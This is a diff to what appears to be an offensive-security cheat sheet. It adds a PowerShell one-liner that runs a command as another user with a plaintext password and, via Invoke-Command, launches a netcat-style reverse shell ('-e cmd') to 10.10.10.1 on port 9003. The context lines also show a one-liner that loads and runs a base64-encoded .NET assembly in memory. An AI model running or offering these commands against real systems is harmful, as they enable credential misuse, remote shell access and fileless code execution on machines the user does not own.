@@ -6,6 +6,7 @@ author_profile: true
 ---
 
 - [Powershell](#powershell)
+  - [One liner run command as another user](#one-liner-run-command-as-another-user)
   - [One liner to execute base64 encoded assembly](#one-liner-to-execute-base64-encoded-assembly)
   - [Run arbitrary assembly](#run-arbitrary-assembly)
   - [Download file](#download-file)
@@ -33,6 +34,10 @@ author_profile: true
   - [Tools](#tools)
 
 ## Powershell
+### One liner run command as another user
+```
+$secpasswd = ConvertTo-SecureString "xxxxx" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("DOMAIN\USER", $secpasswd); Invoke-Command -ComputerName re -Credential $creds -ScriptBlock {c:\path\to\cmd.exe 10.10.10.1 9003 -e cmd}
+```
 ### One liner to execute base64 encoded assembly
 ```
 [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(<base64-str-here>)).EntryPoint.Invoke($null,@(,([string[]](""))))
